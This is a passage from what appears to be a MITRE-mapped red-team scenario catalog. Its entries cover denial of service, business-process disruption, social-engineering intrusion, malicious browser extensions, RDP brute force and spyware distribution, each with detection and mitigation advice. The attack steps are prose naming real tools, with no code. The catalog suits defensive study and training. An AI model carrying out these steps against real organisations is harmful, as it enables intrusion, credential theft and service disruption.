- **Attack Steps**: The attacker scans for internal NTP servers that respond to the deprecated monlist command. From a compromised host inside the network, they forge UDP packets that appear to originate from the IP of an internal application server. These spoofed packets request monlist data from internal NTP servers, which then reply with large UDP payloads (amplified responses). The internal target is overwhelmed by these incoming unsolicited replies, leading to packet loss and service interruption. The attacker uses a bot script to maintain the request flood for several minutes, saturating the internal bandwidth.
- **Detection**: Monitor anomalous NTP responses and spoofed request patterns
- **Solution**: Disable monlist on all internal NTP servers or upgrade to patched versions
- **Tags**: ntp, amplification, udp flood

## Memory Exhaustion via Recursive API Calls

- **Attack Type**: Impact → Denial-of-Service (Internal)
- **Target**: Internal API Server
- **Vulnerability**: No input limits, recursion checks, or memory thresholds
- **MITRE**: T1499.003
- **Impact**: Service unavailability and backend crashes
- **Tools**: Postman, Burp Suite
- **Scenario**: Malicious user invokes deeply nested or recursive API endpoints repeatedly to crash services.
- **Attack Steps**: With access to internal APIs (authenticated or using stolen credentials), the attacker crafts a request to a recursive or stack-heavy API endpoint (e.g., report generator or recursive search). They send a high-frequency stream of malformed but syntactically valid requests using automation tools like Postman or Burp Intruder. Each API call initiates memory-heavy recursive operations on the backend. Over time, this results in memory saturation and eventually an out-of-memory crash in the microservice or container. The API becomes inaccessible for all users until restarted or scaled.
- **Detection**: Log recursive API depth and monitor heap/memory usage spikes
- **Solution**: Limit API recursion depth and rate-limit endpoints
- **Tags**: api, recursion, memory exhaustion

## Manipulation of ERP Job Queues

- **Attack Type**: Impact → Business Process Disruption
- **Target**: ERP Servers
- **Vulnerability**: Lack of workflow integrity and audit controls
- **MITRE**: T1499
- **Impact**: Missed financial operations, halted approvals
- **Tools**: SAP GUI, Python Scripts
- **Scenario**: ERP system job queues are flooded or misconfigured to delay or cancel automated workflows.
- **Attack Steps**: The attacker gains access to the ERP system (e.g., SAP) using stolen or misused credentials. They access the job scheduler and modify multiple background jobs by either changing the execution time, canceling critical jobs (like payroll or inventory sync), or submitting high-priority dummy jobs that overload the scheduler. The legitimate jobs are pushed down the queue, never execute, or are delayed by hours. Business operations reliant on scheduled jobs like procurement approvals or payroll are significantly disrupted.
- **Detection**: Monitor job scheduler anomalies and high job failure rates
- **Solution**: Implement workflow integrity and role-based access controls
- **Tags**: erp, sap, job manipulation

## Disruption of VOIP Infrastructure

- **Attack Type**: Impact → Business Process Disruption
- **Target**: VOIP Call Manager
- **Vulnerability**: No SIP rate limiting or authentication on INVITE
- **MITRE**: T1499
- **Impact**: Communication blackout in business units
- **Tools**: SIPp, VoIP Call Flooder
- **Scenario**: Floods internal SIP servers with bogus call requests to block legitimate voice traffic.
- **Attack Steps**: Once inside the network, the attacker targets the VOIP server (e.g., Cisco CUCM or Asterisk) with thousands of fake SIP INVITE packets per second using the SIPp tool. These requests initiate fake call sessions that overwhelm the call manager’s session and media resources. As a result, legitimate phone calls cannot be connected, dropped mid-session, or face excessive latency. This severely impacts helpdesks, customer support, and executive communication.
- **Detection**: Monitor for excessive INVITE packets and failed call attempts
- **Solution**: Enforce call rate limits and SIP authentication
- **Tags**: voip, sip flood, call denial

## Blocking Finance System via Database Locking

- **Attack Type**: Impact → Business Process Disruption
- **Target**: Finance Database
- **Vulnerability**: No query timeout or session monitoring
- **MITRE**: T1499
- **Impact**: Invoicing and payments halted
- **Tools**: SQLMap, Custom SQL Scripts
- **Scenario**: Attacker locks critical database tables to prevent invoice processing and report generation.
- **Attack Steps**: The attacker accesses the backend database (e.g., Oracle, MSSQL) and issues crafted BEGIN TRANSACTION commands with SELECT FOR UPDATE on key financial tables (e.g., invoices, payments). The session holds the lock open indefinitely by avoiding commit/rollback. This prevents the application layer from accessing or modifying those tables. Invoice generation, payment processing, and report exports stall. Admins cannot terminate the session easily if done via backdoor user.
- **Detection**: Detect long-held locks and stalled transactions
- **Solution**: Apply transaction timeout and auto-kill rules
- **Tags**: sql, db lock, finance stall

## Ransomware Simulation Targeting HR Systems

- **Attack Type**: Impact → Business Process Disruption
- **Target**: HR Application Server, File Shares
- **Vulnerability**: Insufficient access controls and file monitoring
- **MITRE**: T1486
- **Impact**: Missed hiring deadlines, payroll panic
- **Tools**: Eicar Ransomware Sim, GPG Scripts
- **Scenario**: Encrypts key HR-related files and services during working hours, delaying onboarding and payroll.
- **Attack Steps**: The attacker times the attack to occur just before the weekly HR operations window (e.g., Thursday morning). Using access to an HR file share and employee records system, they simulate ransomware behavior by encrypting .docx, .xlsx, and .pdf files using GPG and renaming them. They also disable the HR portal by stopping its IIS service. Although no data is exfiltrated, this disrupts onboarding sessions, background checks, and salary processing. Staff must scramble for backup recovery.
- **Detection**: Look for encryption bursts and service drops
- **Solution**: Apply file integrity monitoring and access restrictions
- **Tags**: hr, ransomware, onboarding

## Workflow Corruption in Document Approval System

- **Attack Type**: Impact → Business Process Disruption
- **Target**: Document Management System
- **Vulnerability**: Weak workflow integrity and lack of change auditing
- **MITRE**: T1499
- **Impact**: Contract processing and audits delayed
- **Tools**: SharePoint GUI, Power Automate
- **Scenario**: Alters workflow routing rules to misdirect or stall document approvals in SharePoint or DMS.
- **Attack Steps**: The attacker accesses a document management platform (e.g., SharePoint or Alfresco) with elevated privileges. They alter automation rules such that key document approval flows (e.g., contracts, audit forms) are rerouted to inactive or wrong users, or stuck in looped flows. Documents requiring approval are never finalized. Teams face legal and financial delays, particularly in vendor onboarding and compliance submissions.
- **Detection**: Monitor workflow logic changes and approval time anomalies
- **Solution**: Lock automation rules to admins, enable audit logging
- **Tags**: sharepoint, workflow attack, misrouting

## Email Queue Jam in Internal Mail Server

- **Attack Type**: Impact → Business Process Disruption
- **Target**: Internal Email Server
- **Vulnerability**: No per-user mail sending limits or content filters
- **MITRE**: T1499.003
- **Impact**: Business-wide communication delay
- **Tools**: Python SMTP Script, SendEmail
- **Scenario**: Mass-sending large internal emails to jam mail queues and delay employee communication.
- **Attack Steps**: The attacker, using access to a compromised internal account, scripts a loop that sends hundreds of large internal emails (each 10–20 MB with attachments) to distribution groups (e.g., all-staff@corp.com). The email server (e.g., Exchange or Postfix) begins queuing these mails. Within minutes, normal employee-to-employee email traffic is delayed or rejected due to spool saturation. Service desks and executives cannot send or receive urgent approvals or alerts. The attacker further configures the script to retry failed deliveries, sustaining the overload and delaying detection.
- **Detection**: Monitor mail queue size and delivery latency
- **Solution**: Set rate limits and attachment size restrictions
- **Tags**: email, smtp abuse, mail flooding

## Disrupting Logistics App via Time-Based Logic Bomb

- **Attack Type**: Impact → Business Process Disruption
- **Target**: Logistics Tracking System
- **Vulnerability**: No file integrity checks or job visibility
- **MITRE**: T1499
- **Impact**: Operational paralysis during logistics windows
- **Tools**: Python, Windows Task Scheduler
- **Scenario**: Logic bomb triggers time-specific failure in logistics tracking system.
- **Attack Steps**: Attacker implants a small Python script that checks system time and triggers only at peak operational hours (e.g., 8 AM to 10 AM). On match, it renames or deletes the real-time vehicle location CSV files required by the logistics dashboard. Additionally, the script stops the GPS polling service and replaces location data with junk. Since this only happens during peak business activity, detection is delayed, while shipping and delivery managers are unable to track goods. This creates internal panic, shipment delays, and customer dissatisfaction.
- **Detection**: Log all job triggers and time-specific behaviors
- **Solution**: Enable code review and file integrity monitoring
- **Tags**: logic bomb, gps disruption, logistics

## ERP Order Tampering to Disrupt Manufacturing

- **Attack Type**: Impact → Business Process Disruption
- **Target**: ERP / MRP System
- **Vulnerability**: No secondary approval for production changes
- **MITRE**: T1499
- **Impact**: Manufacturing process failure and supply chain delay
- **Tools**: SAP GUI, SQL Scripts
- **Scenario**: Alters quantities in manufacturing orders to cause overproduction or stockouts.
- **Attack Steps**: Attacker logs into the ERP system with procurement privileges and accesses the production order module. They modify the Bill of Materials (BOM) entries or production order quantities to reflect incorrect numbers—e.g., ordering 10,000 units instead of 1,000. The system automatically triggers inventory and scheduling changes based on this input. This causes overconsumption of raw materials, machine overuse, or underproduction, depending on the manipulation. Quality checks fail due to misalignments, halting production lines mid-day.
- **Detection**: Review unusual order change frequency or scale
- **Solution**: Enforce workflow approvals and segregation of duties
- **Tags**: erp tampering, production, supply chain

## Disrupting Authentication Services via Session Table Exhaustion

- **Attack Type**: Impact → Business Process Disruption
- **Target**: LDAP/SSO Server
- **Vulnerability**: No brute-force lockout on internal network
- **MITRE**: T1110
- **Impact**: User login failures across apps
- **Tools**: Hydra, Custom Login Flood Tool
- **Scenario**: Floods LDAP/SSO authentication services with fake login attempts to exhaust session slots.
- **Attack Steps**: Using valid usernames scraped from internal AD, the attacker floods the LDAP authentication system with hundreds of concurrent login attempts using random or incorrect passwords. This exhausts session capacity in the SSO system, causing valid users to be rejected or delayed during login. Business-critical platforms tied to LDAP/SSO—like Jira, internal portals, and email—start failing authentication. The attacker sustains the flood using rotating IPs within the internal subnet and times the attack during shift changes for max disruption.
- **Detection**: Monitor failed logins and LDAP session thresholds
- **Solution**: Set internal login rate limits and behavior alerts
- **Tags**: sso, login flood, auth dos

## Misuse of Automated Workflows to Spam Helpdesk

- **Attack Type**: Impact → Business Process Disruption
- **Target**: Helpdesk Ticketing System
- **Vulnerability**: No CAPTCHA or abuse checks in internal forms
- **MITRE**: T1499.003
- **Impact**: IT support overload, SLA breach
- **Tools**: Helpdesk Portal + Automation Rules
- **Scenario**: Repeatedly triggers helpdesk automation to overwhelm support staff and ticketing system.
- **Attack Steps**: The attacker accesses the internal helpdesk portal (e.g., Jira Service Desk or Freshservice) and finds an open ticket submission form with automation enabled. They write a script that submits hundreds of tickets with varying issues (e.g., printer not working, VPN failing), each auto-triggers an assignment, email, and Slack alert to support staff. The queue becomes unmanageable within minutes. Genuine employee requests get lost in noise, SLA breaches occur, and the IT team is forced into manual triage. Attack continues until script or user is blocked.
- **Detection**: Monitor ticket volume and alert burst rules
- **Solution**: Use CAPTCHA + input validation + rate limiting
- **Tags**: helpdesk, automation abuse, ticket storm

## Workflow Freeze via API Abuse in Procurement App

- **Attack Type**: Impact → Business Process Disruption
- **Target**: Procurement Portal / API
- **Vulnerability**: Improper access control on internal API endpoints
- **MITRE**: T1499.003
- **Impact**: Frozen workflows in purchasing
- **Tools**: Postman, cURL
- **Scenario**: Attacker abuses public API to lock workflow states in procurement system.
- **Attack Steps**: After gaining access to the procurement platform, the attacker reverse-engineers the publicly exposed API used for managing approval flows. They identify an endpoint that allows update of workflow statuses without authentication for internal users. Using a looped script and Postman runner, they update dozens of procurement requests’ statuses to “Waiting on Vendor” — a non-actionable state — for open purchase orders. Procurement team members cannot proceed without vendor confirmation, which was never actually requested. This stalls ordering processes for critical hardware and services across departments.
- **Detection**: Log abnormal API usage and status field anomalies
- **Solution**: Enforce strict API access control, log API calls
- **Tags**: procurement, api, status lock

## Critical App Update Block via Proxy ACL Manipulation

- **Attack Type**: Impact → Business Process Disruption
- **Target**: Proxy / Update Infrastructure
- **Vulnerability**: Poorly secured proxy config and unmonitored egress
- **MITRE**: T1499.004
- **Impact**: Update failures, software malfunctions
- **Tools**: Burp Suite, Squid Proxy
- **Scenario**: Prevents critical app updates by tampering with outbound proxy ACLs.
- **Attack Steps**: With access to internal proxy configuration or an exposed web panel (e.g., Squid Proxy Admin), the attacker edits the outbound ACL rules to silently drop update server connections for business-critical apps (e.g., antivirus dashboard, backup agent, license managers). Employees continue using outdated or invalidated software versions that eventually trigger failures or compliance flags. For example, the backup app silently fails to sync due to unreachable update server. Issue goes unnoticed until data loss occurs.
- **Detection**: Monitor dropped outbound connections to known update servers
- **Solution**: Restrict proxy admin access and audit all ACL changes
- **Tags**: proxy, app update block, egress tampering

## Impersonating IT Staff via Slack to Push Remote Tool

- **Attack Type**: Initial Access → Social Engineering (Live)
- **Target**: Internal Slack + End-User Laptop
- **Vulnerability**: Lack of internal user verification + social trust
- **MITRE**: T1566.002
- **Impact**: Initial remote foothold with user privileges
- **Tools**: Slack, AnyDesk, Python Payload
- **Scenario**: Attacker joins Slack as fake IT personnel to trick user into installing malicious remote tool.
- **Attack Steps**: The attacker obtains a list of internal employees from a leaked email thread or LinkedIn scraping. They create a Slack user mimicking an IT admin (e.g., “Ankit Patel - IT Helpdesk”). Posing as a support engineer, they direct-message a junior employee claiming there’s a new remote diagnostics tool they must install due to “performance issues.” The attacker sends a link to a disguised AnyDesk installer bundled with a Python RAT. The employee installs it, granting the attacker remote access to their system without suspicion. The attacker now controls a machine inside the corporate network.
- **Detection**: Look for unapproved remote tool installations and new Slack DM patterns
- **Solution**: Enforce signed installer policies + verify Slack IT identities
- **Tags**: slack, it impersonation, remote access

## Baiting Employee to Install “Support Fix Tool” via Phone Call

- **Attack Type**: Initial Access → Social Engineering (Live)
- **Target**: Employee Workstation
- **Vulnerability**: Trust in phone-based authority, no tool execution warnings
- **MITRE**: T1566.001
- **Impact**: Reverse shell into corporate network
- **Tools**: VoIP Call, MSBuild Payload
- **Scenario**: Attacker cold-calls target, claims urgent fix needed, and convinces them to run a fake tool.
- **Attack Steps**: The attacker phones the company using VoIP and asks to speak to a junior IT staff member or intern. Claiming to be from the "internal IT escalation team," they assert there’s a server-side sync issue and request the user to download a “quick fix patch” from a company-looking domain (actually attacker-controlled). The tool is a Trojan compiled using MSBuild and hidden as a .docx file. The employee follows instructions and unknowingly executes the payload. This grants the attacker reverse shell access and possibly domain credentials via token stealing.
- **Detection**: Voice logs or user-reported suspicious support call
- **Solution**: Train staff to verify identities and block macro-based tools
- **Tags**: phone, baiting, msbuild payload

## Tailgating Attack for Physical Network Access

- **Attack Type**: Initial Access → Social Engineering (Live)
- **Target**: Physical Office LAN & Workstations
- **Vulnerability**: No escort policies + open physical ports
- **MITRE**: T1200, T1078
- **Impact**: Physical breach leading to persistent foothold
- **Tools**: USB Rubber Ducky, LAN Drop Device
- **Scenario**: Attacker gains physical access to office LAN by tailgating employee.
- **Attack Steps**: Wearing a branded T-shirt and fake badge, the attacker waits outside the corporate building until an employee enters with a keycard. Timing their move, they follow in close proximity (tailgating) and walk through the door unnoticed. Once inside, they locate an unattended conference room or printer area, plug a LAN drop device (e.g., LAN Turtle) into an open Ethernet port, and install a USB Rubber Ducky on a workstation posing as a keyboard. The drop establishes a reverse VPN tunnel, giving the attacker persistent internal access.
- **Detection**: Check for rogue LAN devices + audit visitor movement
- **Solution**: Enforce tailgate prevention + port security + camera logging
- **Tags**: tailgating, lan access, rogue device

## Malicious Chrome Extension via Phishing

- **Attack Type**: Persistence → Malicious Browser Extensions
- **Target**: End-user Browsers
- **Vulnerability**: Social engineering + user trust in Chrome extensions
- **MITRE**: T1176
- **Impact**: Credential theft, browser session hijacking
- **Tools**: EvilExt, Chrome Dev Tools
- **Scenario**: Attacker lures user to install a fake productivity plugin via phishing email.
- **Attack Steps**: The attacker creates a fake Chrome extension mimicking a productivity plugin (“Secure PDF Viewer”) and hosts it on a lookalike webstore. A spear-phishing email is sent to internal staff with a “critical HR policy” PDF that prompts the user to install the plugin to view. Once installed, the extension requests broad permissions (tabs, storage, webRequest) and sends all visited URLs, cookies, and keystrokes to the attacker's C2 server. It stays persistent across reboots and survives Chrome updates.
- **Detection**: Monitor unknown extensions with excessive permissions
- **Solution**: Block unauthorized extension installs via policy
- **Tags**: chrome, phishing, persistence

## Drive-by Extension Injection via Fake Update

- **Attack Type**: Persistence → Malicious Browser Extensions
- **Target**: Browser + OS
- **Vulnerability**: Insecure browser config, user interaction
- **MITRE**: T1176
- **Impact**: Session takeover, clipboard theft
- **Tools**: BeEF, JS Injector
- **Scenario**: Fake “Chrome Update Required” page injects backdoored extension.
- **Attack Steps**: Victim visits a compromised blog site where a JavaScript hook detects outdated Chrome versions and redirects to a fake update page. The page displays a native-style Chrome popup asking the user to “update” — triggering a download of a malicious extension CRX file. The extension installs using developer mode or via command-line install from a bundled executable. Once live, it begins exfiltrating browser storage and clipboard data.
- **Detection**: Detect unsigned extension installs and dev-mode usage
- **Solution**: Disable dev-mode extension installs
- **Tags**: drive-by, chrome, clipboard

## Internal Browser Extension Repo Poisoning

- **Attack Type**: Persistence → Malicious Browser Extensions
- **Target**: Internal Dev Infrastructure
- **Vulnerability**: Weak access control on CI/CD pipeline
- **MITRE**: T1176
- **Impact**: Widespread data theft across departments
- **Tools**: Zip Cracker, VSCode, WebStore CLI
- **Scenario**: Attacker poisons internal extension repo with trojanized version of approved plugin.
- **Attack Steps**: Organization uses an internal extension repo for distributing custom tools (e.g., “CorpClipboard Manager”). Attacker gains access via exposed CI/CD credentials and modifies the extension to include a malicious JavaScript keylogger. When the extension auto-updates across employee browsers, it silently begins stealing passwords entered into internal apps. Admins don't detect the change because the extension ID and name remain identical.
- **Detection**: Monitor internal extension updates and file hashes
- **Solution**: Use signed extensions and CI/CD access hardening
- **Tags**: extension hijack, internal repo, supply chain

## Malicious Extension Installed via USB Drop

- **Attack Type**: Persistence → Malicious Browser Extensions
- **Target**: Physical Endpoint
- **Vulnerability**: No USB control or script execution monitoring
- **MITRE**: T1176
- **Impact**: Persistent, stealth browser-based spying
- **Tools**: Rubber Ducky, Powershell
- **Scenario**: Plug-and-exploit via USB installs a Chrome extension via autorun script.
- **Attack Steps**: Attacker drops USB sticks labeled “Company Strategy 2024” in the office parking lot. A curious employee plugs it in. An autorun script launches PowerShell, installs a malicious CRX file into Chrome using command-line arguments, and disables warnings using registry edits. The extension steals browser cookies and syncs browsing history to an external server every hour.
- **Detection**: Look for unauthorized extensions with CLI-based install
- **Solution**: Block USB autorun + control storage access
- **Tags**: usb drop, autorun, chrome extension

## Malicious Edge Extension via Microsoft Store Clone

- **Attack Type**: Persistence → Malicious Browser Extensions
- **Target**: Web Browser
- **Vulnerability**: Fake webstore clone + user error
- **MITRE**: T1176
- **Impact**: Credential hijacking via tokens
- **Tools**: HTML Cloner, Edge Extension Packager
- **Scenario**: Attacker creates fake Microsoft Store portal to mimic real plugin.
- **Attack Steps**: The attacker clones a Microsoft Edge extension (e.g., Grammarly) and republishes it on a fake Microsoft Store clone (micros0ftstore.com). The extension includes silent tracking scripts and steals JWTs from corporate dashboards. A social engineering post in a forum links to this store. Victim downloads it, believing it’s the original. The extension abuses webRequest and activeTab permissions to steal session tokens.
- **Detection**: Detect web traffic to fake stores and verify plugin sources
- **Solution**: Educate users + restrict extension permissions
- **Tags**: edge, store impersonation, jwt theft

## Self-Installing Extension via JS Bookmarklet

- **Attack Type**: Persistence → Malicious Browser Extensions
- **Target**: Bookmarks & Browser
- **Vulnerability**: Exploitable DevTools + insecure bookmark use
- **MITRE**: T1176
- **Impact**: Keylogging internal platforms
- **Tools**: Bookmark Injector
- **Scenario**: A bookmarklet triggers a hidden install process for a backdoored extension.
- **Attack Steps**: The attacker sends an internal employee a helpful “Productivity Tip” link that the user saves as a bookmarklet. When clicked, the JavaScript silently executes an XMLHttpRequest that downloads and auto-installs a hidden Chrome extension using DevTools API. It injects keyloggers into every internal app the user visits (via content_scripts). The user sees no visual cues except a slight lag on form submission.
- **Detection**: Monitor bookmark actions and DevTools calls
- **Solution**: Disable DevTools extension APIs for non-admins
- **Tags**: bookmarklet, extension dropper, chrome

## Man-in-the-Browser Extension in Enterprise Kiosk

- **Attack Type**: Persistence → Malicious Browser Extensions
- **Target**: Public Browser (Kiosk)
- **Vulnerability**: No kiosk lockdown, Dev Mode enabled
- **MITRE**: T1176
- **Impact**: Harvests dozens of credentials silently
- **Tools**: Chromium Dev Tools, Cron Jobs
- **Scenario**: Preloads malicious plugin onto a shared kiosk before public use.
- **Attack Steps**: Attacker physically accesses a shared kiosk (e.g., at front desk) and installs a malicious extension manually via Chrome’s Developer Mode. The extension waits for form inputs (e.g., name, phone, or internal ticketing credentials) and logs them. A cron job keeps the plugin alive by restarting Chrome if closed. Because the kiosk is re-used by multiple employees, every session is compromised.
- **Detection**: Kiosk audit logs + Chrome extension scan
- **Solution**: Lock Chrome settings and restrict write access
- **Tags**: kiosk, dev mode, shared terminal

## Obfuscated Extension Triggered by Visiting Internal Tool

- **Attack Type**: Persistence → Malicious Browser Extensions
- **Target**: Browser (Chrome)
- **Vulnerability**: Obfuscated code + domain trigger logic
- **MITRE**: T1176
- **Impact**: Targeted data exfiltration from internal tools
- **Tools**: JS Obfuscator, Chrome APIs
- **Scenario**: Extension stays dormant until user visits internal dashboard, then activates keylogger.
- **Attack Steps**: Extension installed by attacker is heavily obfuscated and whitelisted to avoid AV. It monitors visited domains and remains idle until detecting intranet.corp.local. Once this internal tool is accessed, it activates content scripts that hook input fields and steal data silently. The keylogger only functions in this domain, making detection harder. It exfiltrates in base64 via harmless-looking requests to an analytics domain.
- **Detection**: Monitor webRequest API and suspicious GET calls
- **Solution**: Whitelist-only trusted extension sources
- **Tags**: stealth, obfuscation, domain triggered

## Credential Harvesting via Shared Extension Marketplace

- **Attack Type**: Persistence → Malicious Browser Extensions
- **Target**: Chrome Web Store
- **Vulnerability**: Inadequate extension code reviews
- **MITRE**: T1176
- **Impact**: Mass credential exposure
- **Tools**: WebStore CLI, Faker.js
- **Scenario**: Attacker submits useful plugin with hidden data collector to public store.
- **Attack Steps**: The attacker creates a browser extension that genuinely improves a dev workflow (e.g., JSON formatter) and publishes it to the Chrome Web Store. The plugin includes a small, obfuscated script that sends content of any password, email, or token fields from pages visited to a webhook endpoint. Over time, as employees install it independently for convenience, the attacker collects corporate credentials at scale.
- **Detection**: Monitor extension usage and permissions by domain
- **Solution**: Conduct periodic extension audits
- **Tags**: public store, credential grabber

## Persistence via Extension Sync across Devices

- **Attack Type**: Persistence → Malicious Browser Extensions
- **Target**: Multi-Device Chrome
- **Vulnerability**: Unmonitored sync behavior
- **MITRE**: T1176
- **Impact**: Cross-device persistent credential logging
- **Tools**: Chrome Policy Abuse
- **Scenario**: Chrome Sync enables plugin to auto-install on all employee devices.
- **Attack Steps**: Attacker installs a malicious extension onto a device already signed into Chrome with sync enabled. The extension (using low-observable permissions) spreads silently to other devices linked to the same account — e.g., work desktop, laptop, home system. The extension logs form submissions on all synced browsers. Because sync doesn’t prompt the user, the install is invisible unless inspected manually.
- **Detection**: Detect unknown synced extensions or silent installs
- **Solution**: Disable extension sync on corporate devices
- **Tags**: chrome sync, cross-device, stealth

## Custom Extension Installed via Powershell Post-Exploit

- **Attack Type**: Persistence → Malicious Browser Extensions
- **Target**: End-user Laptop
- **Vulnerability**: Direct file system tampering + Chrome weak config
- **MITRE**: T1176
- **Impact**: Persistent surveillance tool on browser
- **Tools**: PowerShell, CRX Injector
- **Scenario**: After gaining shell access, attacker persists via extension install.
- **Attack Steps**: Attacker post-exploitation drops a script that silently installs a malicious browser extension by manipulating Chrome’s Preferences file directly and placing the CRX in the user’s extension folder. A registry tweak disables signature warnings. The extension reboots with the browser and runs background processes for screenshot capture and clipboard monitoring. It stays hidden from UI via JSON preference obfuscation.
- **Detection**: Look for modified Preferences file or unsanctioned CRXs
- **Solution**: Harden file permissions and validate extension manifests
- **Tags**: post-exploit, powershell persistence

## Stealth Credential Stealer via DOM Injection

- **Attack Type**: Persistence → Malicious Browser Extensions
- **Target**: Browsers (Any)
- **Vulnerability**: DOM-based injection stealth
- **MITRE**: T1176
- **Impact**: Invisible credential interception
- **Tools**: JS Hooking Lib, Extension APIs
- **Scenario**: Plugin rewrites HTML to intercept credentials from login forms.
- **Attack Steps**: The extension injects JavaScript via content_scripts into login portals. Instead of logging credentials, it modifies the submit handler on-the-fly, siphoning form inputs before actual submission. It then restores the DOM and submits normally. This behavior is masked from view, and even security teams reviewing POST data see nothing unusual. Credentials are exfiltrated via hidden pixel-tracking image URLs.
- **Detection**: Monitor modified event listeners + exfil domains
- **Solution**: Inspect extension DOM behavior + alert on unauthorized form hooks
- **Tags**: dom abuse, formhooking, stealth plugin

## Extension Persistence via Auto-Deploy GPO Policy

- **Attack Type**: Persistence → Malicious Browser Extensions
- **Target**: Chrome via GPO
- **Vulnerability**: GPO hijack, auto-deploy abuse
- **MITRE**: T1176
- **Impact**: Domain-wide browser compromise
- **Tools**: AD GPO, Registry Editor
- **Scenario**: Malicious plugin deployed to all employees via Group Policy Object.
- **Attack Steps**: Attacker compromises an IT admin account and modifies GPO settings to deploy a new extension to all Chrome users in the domain using registry keys (Software\\Policies\\Google\\Chrome\\ExtensionInstallForcelist). The extension runs in the background, monitors URLs, and auto-logs all OAuth redirect tokens. Because it’s GPO-pushed, it cannot be removed by users.
- **Detection**: Audit GPO extension force-list entries regularly
- **Solution**: Secure GPO changes and restrict extension policy editing
- **Tags**: gpo, enterprise-wide, token theft

## Cloud Browser Plugin Exploit via Remote Worker

- **Attack Type**: Persistence → Malicious Browser Extensions
- **Target**: Remote Browser
- **Vulnerability**: Social engineering of cloud-dependent users
- **MITRE**: T1176
- **Impact**: Persistent access to SaaS portals
- **Tools**: Zoom, Google Workspace, CRX Payload
- **Scenario**: Remote worker tricked into installing extension for cloud SaaS.
- **Attack Steps**: During a fake Zoom support session, the attacker shares screen and directs a remote employee to install a "required Google Docs enhancement" plugin. The plugin includes script to scrape access tokens from localStorage for GDrive and Gmail. Since the employee uses a browser for all work, the attacker gains persistent access to corporate data via token reuse.
- **Detection**: Monitor token API calls and plugin activity
- **Solution**: Enforce SSO/OAuth revocation and plugin whitelisting
- **Tags**: cloud, gdrive, token access

## Exploit Trusted Extension Update to Add Backdoor

- **Attack Type**: Persistence → Malicious Browser Extensions
- **Target**: Extension Dev Pipeline
- **Vulnerability**: Supply chain via OSS plugin
- **MITRE**: T1176
- **Impact**: Trusted extension becomes threat vector
- **Tools**: GitHub, Obfuscator, Extension Manifest
- **Scenario**: Attacker contributes code to an open-source extension and adds malware in update.
- **Attack Steps**: The attacker finds an open-source extension used in the company (e.g., “Dark Mode Everywhere”), forks the project and submits a seemingly benign pull request. Once accepted and pushed live, they upload a new version to the Chrome Web Store. The update includes obfuscated malware in a new background service worker file. Because it’s from a “trusted” source, the extension auto-updates silently, backdooring thousands of endpoints.
- **Detection**: Audit all extension updates and diff release code
- **Solution**: Mirror open-source plugins and pin versions
- **Tags**: open source, supply chain, chrome store

## Remote Desktop Brute Force Variant

- **Attack Type**: Credential Brute Force
- **Target**: RDP Server
- **Vulnerability**: Weak passwords, exposed services
- **MITRE**: T1110.001 – Brute Force: Password Guessing
- **Impact**: Unauthorized access, lateral movement, full compromise
- **Tools**: Hydra, Ncrack, Masscan, Crowbar
- **Scenario**: The attacker identifies misconfigured RDP services over the internet, then launches a distributed brute-force campaign using rotating IPs and targeted username-password combinations to gain access to the remote host.
- **Attack Steps**: 1. Begin by scanning large IP blocks using Masscan to rapidly detect hosts with port 3389 open.2. Use Nmap to fingerprint detected hosts and verify that they’re running RDP services.3. Create a tailored list of usernames (e.g., “admin”, “administrator”, company-specific accounts) and password lists including common, leaked, or guessable credentials.4. Initiate a brute-force attack using Hydra or Crowbar, distributing attempts across multiple IPs to avoid detection or throttling.5. Upon a successful login, connect via RDP and enumerate the system for privilege escalation vectors.6. Exploit unpatched software or abuse privilege misconfigurations to escalate to SYSTEM.7. Establish persistence using scheduled tasks or registry modifications for long-term access.
- **Detection**: Abnormal login attempts, failed login logs, GeoIP login mismatches
- **Solution**: Enforce multi-factor authentication, implement account lockouts, restrict RDP to VPN only
- **Tags**: RedTeam, InitialAccess, RDP, BruteForce, PasswordSpray, MITRE_T1110_001

## Torrent-Based Spyware Deployment

- **Attack Type**: Trojanized Software Download
- **Target**: Human (Torrent User)
- **Vulnerability**: Untrusted sources, user curiosity
- **MITRE**: T1204.002 – User Execution: Malicious File
- **Impact**: Keylogging, data exfiltration, persistent control
- **Tools**: Inno Setup, njRAT, BitTorrent
- **Scenario**: A seemingly legitimate version of a popular software (e.g., Photoshop) is bundled with spyware and seeded heavily on torrent sites to attract users looking for free cracked versions.
- **Attack Steps**: 1. The attacker binds spyware (e.g., njRAT or custom keylogger) with a cracked installer using Inno Setup or similar tools.2. The bundled package is uploaded to popular torrent trackers with attractive filenames and fake user comments indicating legitimacy.3. The attacker ensures multiple seeders to keep the upload highly available.4. A target user downloads and installs the software, expecting a functional cracked version.5. During installation, the spyware executes silently in the background while also showing a fake installation progress.6. The malware establishes command and control (C2) communication to exfiltrate keystrokes, screenshots, and other user data.7. It maintains persistence through registry keys and scheduled tasks to survive reboots.
- **Detection**: Behavioral AV alerts, unexpected outbound connections
- **Solution**: Block torrent traffic, educate users, use EDR for behavioral detection
- **Tags**: RedTeam, InitialAccess, Spyware, Torrent, MaliciousInstaller, MITRE_T1204_002

## Drive-By Malvertising via Compromised Ad Network

- **Attack Type**: Malvertising / Exploit Kit
- **Target**: Human (Browser User)
- **Vulnerability**: Outdated browser/plugins, ad trust
- **MITRE**: T1189 – Drive-by Compromise
- **Impact**: Malware execution, C2 beaconing
- **Tools**: RIG EK, Cobalt Strike, JavaScript, Ad Exchange
- **Scenario**: Attackers buy ad space on a low-moderation ad exchange and inject JavaScript redirects pointing to a landing page hosting an exploit kit.
- **Attack Steps**: 1. The attacker sets up a legitimate-looking advertiser account on an ad exchange platform.2. They craft ad creatives with hidden JavaScript that redirects the browser to a malicious landing page once the ad is served.3. The landing page fingerprints the victim’s browser and OS to select the most suitable exploit chain.4. The exploit kit (e.g., RIG EK) exploits unpatched browser/plugin vulnerabilities to deliver a payload such as a Cobalt Strike beacon.5. The malware is then executed in-memory to avoid AV detection, and connects to a remote C2 server.6. Persistence mechanisms (e.g., WMI subscriptions, registry hooks) are established to retain control.7. The attacker uses this foothold to laterally move within the internal network.
- **Detection**: Unusual HTTP/S traffic, browser crashes, sandbox alerts
- **Solution**: Use secure browsing plugins, ad blockers, restrict third-party scripts
- **Tags**: RedTeam, InitialAccess, Malvertising, ExploitKit, BrowserAttack, MITRE_T1189

## Backdoored Software Update Campaign

- **Attack Type**: Supply Chain Compromise
- **Target**: Application Update Channel
- **Vulnerability**: Lack of validation, implicit trust in vendor
- **MITRE**: T1195.002 – Supply Chain Compromise
- **Impact**: Remote access, network pivoting
